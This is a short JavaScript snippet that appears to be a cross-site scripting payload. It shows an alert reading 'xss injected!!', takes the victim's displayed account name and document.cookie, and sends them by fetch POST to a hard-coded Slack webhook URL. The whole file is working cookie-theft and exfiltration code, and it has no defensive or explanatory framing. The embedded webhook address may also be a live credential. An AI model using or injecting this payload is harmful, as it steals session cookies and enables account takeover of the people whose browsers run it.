alert('xss injected!!');

var text = `
    User: ${document.querySelector('#__jsview0--headItem-Account-name').innerHTML}

    Cookie: ${document.cookie}
`;

var url = 'https://hooks.slack.com/services/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';

fetch(url, {
    method: 'post',
    body: JSON.stringify({
        text: text
    })
}).then(function(response) {
    console.log(response);
})
